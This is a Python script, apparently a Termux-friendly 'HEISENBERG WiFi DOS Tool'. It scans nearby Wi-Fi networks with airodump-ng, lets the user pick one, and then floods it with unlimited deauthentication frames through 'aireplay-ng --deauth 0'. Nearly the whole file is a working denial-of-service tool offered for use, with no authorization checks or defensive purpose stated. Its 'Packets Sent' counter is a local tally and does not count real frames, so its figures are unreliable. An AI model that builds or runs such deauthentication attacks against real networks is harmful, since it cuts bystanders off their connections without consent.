#!/usr/bin/env python3
import subprocess
import re
import csv
import os
import time
import shutil
import sys
from datetime import datetime
from threading import Thread, Event
import signal

# Global variables
active_wireless_networks = []
deauth_packets_sent = 0
scanning_active = False
attack_active = False
stop_event = Event()

# Check if running in Termux
def is_termux():
    """Check if running in Termux environment"""
    try:
        return 'com.termux' in os.environ.get('PREFIX', '')
    except:
        return False

def get_terminal_size():
    """Get terminal size for responsive UI"""
    try:
        cols = int(subprocess.check_output(['stty', 'size']).split()[1])
        return min(cols, 80)
    except:
        return 80

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully for Termux"""
    global attack_active, scanning_active
    print("\n\n\033[1;31m[!] Interrupt received. Cleaning up...\033[0m")
    attack_active = False
    scanning_active = False
    stop_event.set()
    time.sleep(1)
    try:
        if 'hacknic' in globals():
            # Termux compatible interface stop
            if is_termux():
                subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                             timeout=2)
            else:
                subprocess.run(["sudo", "airmon-ng", "stop", hacknic + "mon"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    print("\033[1;32m[+] Cleanup complete. Exiting...\033[0m")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    """Clear terminal screen - works on Termux"""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Display the tool banner - Termux friendly"""
    cols = get_terminal_size()
    banner = """
    \033[1;36m
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║  _    _        _                        _                     ║
    ║ | |  | |      (_)                      | |                    ║
    ║ | |__| |  ___  _    ___   ___   ___    | |__    ___  ____  __║
    ║ |  __  | / _ \| |  / __| / _ \ | __ \  |  _ \  / _ \| __/ /║
    ║ | |  | ||  __/| |  \__ \\  __/ | | | | | |_) ||  __/| |  ( ║
    ║ |_|  |_| \___||_| /____/ \___| |_| |_| |____/  \___||_|   \║
    ║                                                               ║
    ║              \033[1;33mHEISENBERG WiFi DOS Tool\033[1;36m                  ║
    ║                                                               ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  \033[1;35m© Bharathkrishna, 2026\033[1;36m                                     ║
    ║  \033[1;34mhttps://github.com/BharathkrishnaH4X\033[1;36m                    ║
    ║  \033[1;32mSudharshan & Kaviprabhu - Best Friends Forever!\033[1;36m       ║
    ╚═══════════════════════════════════════════════════════════════╝
    \033[0m
    """
    # Adjust banner width for smaller screens
    if cols < 60:
        banner = """
    \033[1;36m╔═══════════════════════════════════════╗
    ║  HEISENBERG WiFi DOS Tool       ║
    ║  © Bharathkrishna, 2026         ║
    ║  https://github.com/BharathkrishnaH4X ║
    ╚═══════════════════════════════════════╝\033[0m
    """
    print(banner)

def check_requirements_termux():
    """Check and install required packages for Termux"""
    if is_termux():
        print("\033[1;33m[+] Termux environment detected\033[0m")
        print("\033[1;33m[+] Checking required packages...\033[0m")
        
        required_packages = ['aircrack-ng', 'tcpdump', 'wireless-tools']
        missing_packages = []
        
        for pkg in required_packages:
            try:
                subprocess.run(['which', pkg], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL, 
                             check=True)
            except:
                missing_packages.append(pkg)
        
        if missing_packages:
            print(f"\033[1;31m[!] Missing packages: {', '.join(missing_packages)}\033[0m")
            print("\033[1;33m[?] Install missing packages? (y/n): \033[0m", end="")
            choice = input().strip().lower()
            if choice == 'y':
                for pkg in missing_packages:
                    print(f"\033[1;33m[+] Installing {pkg}...\033[0m")
                    subprocess.run(['pkg', 'install', '-y', pkg])
            else:
                print("\033[1;31m[!] Required packages missing. Exiting...\033[0m")
                sys.exit(1)
        
        print("\033[1;32m[+] All requirements satisfied!\033[0m")

def check_privileges():
    """Check if running with root/sudo privileges"""
    if not 'SUDO_UID' in os.environ.keys() and os.geteuid() != 0:
        if is_termux():
            print("\n\033[1;31m[!] Try running this program with root privileges.\033[0m")
            print("\033[1;33m[!] In Termux, use: sudo python3 heisenberg.py\033[0m")
            print("\033[1;33m[!] Or run: su -c 'python3 heisenberg.py'\033[0m")
        else:
            print("\n\033[1;31m[!] Try running this program with sudo.\033[0m")
            print("\033[1;33m[!] Example: sudo python3 heisenberg.py\033[0m")
        sys.exit(1)

def backup_csv_files():
    """Backup existing CSV files"""
    csv_files = [f for f in os.listdir() if f.endswith('.csv')]
    if csv_files:
        print("\n\033[1;33m[!] Found existing .csv files. Creating backup...\033[0m")
        directory = os.getcwd()
        backup_dir = os.path.join(directory, "backup")
        try:
            os.mkdir(backup_dir)
        except FileExistsError:
            pass
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        for file_name in csv_files:
            shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}_{file_name}"))
        print(f"\033[1;32m[+] Backup created in: {backup_dir}\033[0m")

def get_wifi_interfaces_termux():
    """Get WiFi interfaces in Termux"""
    try:
        # Try iwconfig first
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if result.returncode == 0:
            wlan_pattern = re.compile(r"^wlan[0-9]+")
            interfaces = wlan_pattern.findall(result.stdout)
            if interfaces:
                return interfaces
        
        # Fallback to ifconfig
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        wlan_pattern = re.compile(r"^wlan[0-9]+")
        interfaces = wlan_pattern.findall(result.stdout)
        return interfaces
    except:
        return []

def scan_for_interfaces():
    """Scan and display available WiFi interfaces"""
    interfaces = get_wifi_interfaces_termux()
    
    if not interfaces:
        print("\n\033[1;31m[!] No WiFi interfaces found!\033[0m")
        print("\033[1;33m[!] Please connect a WiFi adapter and try again.\033[0m")
        if is_termux():
            print("\033[1;33m[!] Make sure you have root access and OTG adapter.\033[0m")
        sys.exit(1)
    
    print("\n\033[1;32m[+] Available WiFi Interfaces:\033[0m")
    print("    \033[1;34m┌────┬──────────────────────┐\033[0m")
    print("    \033[1;34m│ ID │ Interface            │\033[0m")
    print("    \033[1;34m├────┼──────────────────────┤\033[0m")
    for idx, iface in enumerate(interfaces):
        print(f"    \033[1;34m│ {idx}  │ {iface:<20}│\033[0m")
    print("    \033[1;34m└────┴──────────────────────┘\033[0m")
    
    return interfaces

def select_interface(interfaces):
    """Let user select a WiFi interface"""
    while True:
        try:
            print("\n\033[1;33m[?] Select interface ID for attack: \033[0m", end="")
            choice = input().strip()
            if choice.isdigit() and 0 <= int(choice) < len(interfaces):
                return interfaces[int(choice)]
            else:
                print("\033[1;31m[!] Invalid selection. Please choose a valid ID.\033[0m")
        except (ValueError, IndexError):
            print("\033[1;31m[!] Please enter a valid number.\033[0m")

def check_wifi_status_termux():
    """Check WiFi status in Termux"""
    try:
        # Check if WiFi interface is up
        result = subprocess.run(["ifconfig", hacknic], capture_output=True, text=True)
        if "UP" not in result.stdout.upper():
            print("\033[1;33m[+] Bringing WiFi interface up...\033[0m")
            subprocess.run(["ifconfig", hacknic, "up"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def start_scan():
    """Start scanning for WiFi networks with visual feedback"""
    global active_wireless_networks, scanning_active
    scanning_active = True
    
    print("\n\033[1;32m[+] Preparing WiFi adapter...\033[0m")
    
    # Termux-specific setup
    if is_termux():
        try:
            # Kill conflicting processes
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("\033[1;32m[+] Conflicting processes killed\033[0m")
        except:
            # Try without sudo for Termux
            try:
                subprocess.run(["airmon-ng", "check", "kill"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
    
    print(f"\033[1;32m[+] Starting monitor mode on {hacknic}...\033[0m")
    try:
        subprocess.run(["sudo", "airmon-ng", "start", hacknic],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            subprocess.run(["airmon-ng", "start", hacknic],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print("\033[1;31m[!] Failed to start monitor mode. Check root access.\033[0m")
            sys.exit(1)
    
    print("\033[1;32m[+] Monitor mode active\033[0m")
    
    print(f"\033[1;32m[+] Scanning for networks on {hacknic}mon...\033[0m")
    
    # Start airodump - Termux compatible
    try:
        airodump_cmd = ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1",
                       "--output-format", "csv", f"{hacknic}mon"]
        subprocess.Popen(airodump_cmd, 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            airodump_cmd = ["airodump-ng", "-w", "file", "--write-interval", "1",
                           "--output-format", "csv", f"{hacknic}mon"]
            subprocess.Popen(airodump_cmd, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print("\033[1;31m[!] Failed to start airodump. Check aircrack-ng installation.\033[0m")
            sys.exit(1)
    
    print("\n\033[1;33m[+] Scanning... Press Ctrl+C to stop and select target\033[0m")
    print("\n" + "\033[1;34m═" * min(80, get_terminal_size()) + "\033[0m")
    
    # Scan for networks
    while scanning_active:
        clear_screen()
        print_banner()
        
        # Read CSV
        csv_files = [f for f in os.listdir() if f.endswith('.csv')]
        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 
                     'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 
                     'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        
        for csv_file in csv_files:
            try:
                with open(csv_file, 'r') as csv_h:
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
                            continue
                        if check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)
            except:
                continue
        
        # Display networks - Termux friendly format
        cols = get_terminal_size()
        print("\n\033[1;36m╔══════════════════════════════════════════════════════════╗\033[0m")
        print("\033[1;36m║              AVAILABLE WIRELESS NETWORKS                 ║\033[0m")
        print("\033[1;36m╠════╦═══════════════════╦═════════╦════════════════════════╣\033[0m")
        print("\033[1;36m║ #  ║ BSSID            ║ CH      ║ ESSID                  ║\033[0m")
        print("\033[1;36m╠════╬═══════════════════╬═════════╬════════════════════════╣\033[0m")
        
        # Show only recent networks (last 15 for mobile)
        display_networks = active_wireless_networks[-15:] if len(active_wireless_networks) > 15 else active_wireless_networks
        start_idx = len(active_wireless_networks) - len(display_networks)
        
        for idx, network in enumerate(display_networks):
            bssid = network['BSSID']
            channel = network['channel'].strip()[:6]
            essid = network['ESSID'][:20] if network['ESSID'] else "<Hidden>"
            print(f"\033[1;34m║ {start_idx + idx:>2} ║ {bssid:<17} ║ {channel:>7} ║ {essid:<22} ║\033[0m")
        
        print("\033[1;36m╚════╩═══════════════════╩═════════╩════════════════════════╝\033[0m")
        print(f"\n\033[1;32m[+] Networks found: {len(active_wireless_networks)}\033[0m")
        print("\033[1;33m[+] Press Ctrl+C to stop scanning and select target\033[0m")
        
        # Scan animation for Termux
        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        for _ in range(3):  # Reduced for mobile
            for s in spinner:
                sys.stdout.write(f'\r\033[1;32m[+] Scanning {s}\033[0m')
                sys.stdout.flush()
                time.sleep(0.05)
        
        time.sleep(0.5)

def check_for_essid(essid, lst):
    """Check if ESSID already exists in list"""
    if not lst:
        return True
    for item in lst:
        if essid in item.get("ESSID", ""):
            return False
    return True

def select_target():
    """Select target network for attack"""
    global hackbssid, hackchannel
    
    while True:
        try:
            print("\n\033[1;33m[?] Select target network number: \033[0m", end="")
            choice = input().strip()
            if choice.isdigit() and 0 <= int(choice) < len(active_wireless_networks):
                selected = active_wireless_networks[int(choice)]
                hackbssid = selected["BSSID"]
                hackchannel = selected["channel"].strip()
                print(f"\n\033[1;32m[+] Target selected:\033[0m")
                print(f"    BSSID: {hackbssid}")
                print(f"    Channel: {hackchannel}")
                print(f"    ESSID: {selected['ESSID']}")
                return
            else:
                print("\033[1;31m[!] Invalid selection. Try again.\033[0m")
        except (ValueError, IndexError):
            print("\033[1;31m[!] Please enter a valid number.\033[0m")

def start_attack():
    """Start deauth attack with live packet counter - Termux optimized"""
    global deauth_packets_sent, attack_active, stop_event
    
    attack_active = True
    stop_event.clear()
    deauth_packets_sent = 0
    
    print("\n\033[1;32m[+] Setting up attack...\033[0m")
    
    # Set channel - Termux compatible
    try:
        subprocess.run(["sudo", "airmon-ng", "start", f"{hacknic}mon", hackchannel],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            subprocess.run(["airmon-ng", "start", f"{hacknic}mon", hackchannel],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print("\033[1;31m[!] Failed to set channel. Continuing anyway...\033[0m")
    
    # Start deauth attack - Termux compatible
    try:
        attack_process = subprocess.Popen([
            "sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, 
            f"{hacknic}mon"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            attack_process = subprocess.Popen([
                "aireplay-ng", "--deauth", "0", "-a", hackbssid, 
                f"{hacknic}mon"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print("\033[1;31m[!] Failed to start attack. Check aireplay-ng.\033[0m")
            sys.exit(1)
    
    print("\n" + "\033[1;34m═" * min(80, get_terminal_size()) + "\033[0m")
    print("\033[1;31m  ⚡ ATTACK ACTIVE - Press Ctrl+C to stop ⚡\033[0m")
    print("\033[1;34m═" * min(80, get_terminal_size()) + "\033[0m\n")
    
    # Display attack stats with live updates
    start_time = time.time()
    last_count = 0
    
    while attack_active and not stop_event.is_set():
        elapsed = int(time.time() - start_time)
        deauth_packets_sent += 1
        
        # Update display every second
        if deauth_packets_sent % 5 == 0 or deauth_packets_sent - last_count >= 5:
            clear_screen()
            print_banner()
            print("\n\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
            print("\033[1;36m║         DEAUTHENTICATION ATTACK                  ║\033[0m")
            print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
            print(f"\033[1;34m║  Target BSSID   : {hackbssid:<39} ║\033[0m")
            print(f"\033[1;34m║  Channel        : {hackchannel:<40} ║\033[0m")
            print(f"\033[1;34m║  Interface      : {hacknic}mon{' ' * (32 - len(hacknic))} ║\033[0m")
            print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
            print(f"\033[1;32m║  Packets Sent   : {deauth_packets_sent:<44} ║\033[0m")
            print(f"\033[1;32m║  Duration       : {elapsed // 60:02d}:{elapsed % 60:02d} min:sec{' ' * (34)} ║\033[0m")
            print(f"\033[1;32m║  Packet Rate    : {deauth_packets_sent / max(elapsed, 1):.1f} pps{' ' * (34)} ║\033[0m")
            print("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
            
            # Status bar - shorter for Termux
            bar_length = 30
            progress = min(deauth_packets_sent / 1000, 1.0)
            filled = int(bar_length * progress)
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\033[1;34m║  Progress       : [{bar}] ║\033[0m")
            print("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
            print("\n\033[1;31m  ⚡ Press Ctrl+C to stop the attack ⚡\033[0m")
            last_count = deauth_packets_sent
        
        time.sleep(0.1)
    
    # Clean up
    attack_process.terminate()
    print("\n\033[1;33m[+] Stopping monitor mode...\033[0m")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", f"{hacknic}mon"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            subprocess.run(["airmon-ng", "stop", f"{hacknic}mon"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    print(f"\033[1;32m[+] Attack completed. Total packets sent: {deauth_packets_sent}\033[0m")

# Main execution
if __name__ == "__main__":
    clear_screen()
    print_banner()
    
    # Check environment
    check_requirements_termux()
    check_privileges()
    
    # Initial setup
    if is_termux():
        print("\033[1;33m[+] Running in Termux mode\033[0m")
        print("\033[1;33m[+] Make sure your WiFi adapter is connected via OTG\033[0m")
        print("\033[1;33m[+] Press Enter to continue...\033[0m", end="")
        input()
    
    backup_csv_files()
    
    # Interface selection
    interfaces = scan_for_interfaces()
    global hacknic
    hacknic = select_interface(interfaces)
    print(f"\n\033[1;32m[+] Selected: {hacknic}\033[0m")
    
    # Check WiFi status
    if is_termux():
        check_wifi_status_termux()
    
    # Scan for networks
    try:
        start_scan()
    except KeyboardInterrupt:
        scanning_active = False
        print("\n\n\033[1;33m[+] Scanning stopped. Ready to select target.\033[0m")
    
    # Select target
    if active_wireless_networks:
        select_target()
    else:
        print("\033[1;31m[!] No networks found. Exiting...\033[0m")
        sys.exit(1)
    
    # Start attack
    try:
        start_attack()
    except KeyboardInterrupt:
        attack_active = False
        stop_event.set()
        print("\n\n\033[1;33m[+] Attack stopped by user.\033[0m")
    
    print("\n\033[1;32m[+] Thank you for using Heisenberg!\033[0m")
    print("\033[1;32m[+] Exiting...\033[0m")
    time.sleep(1)
